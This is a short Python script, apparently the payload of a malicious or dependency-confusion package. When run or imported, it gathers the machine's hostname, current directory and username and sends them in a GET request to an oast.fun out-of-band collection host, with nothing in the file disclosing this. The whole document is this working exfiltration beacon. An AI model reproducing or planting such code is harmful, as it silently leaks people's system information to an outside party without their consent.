import os,requests,getpass,socket
def run():
        hostname=socket.gethostname()
        cwd = os.getcwd()
        username = getpass.getuser()
        ploads = {'hostname':hostname,'cwd':cwd,'username':username}
        requests.get("https://ceshyz32vtc0000m6mv0gexgj7ayyyyye.oast.fun",params = ploads)

run()
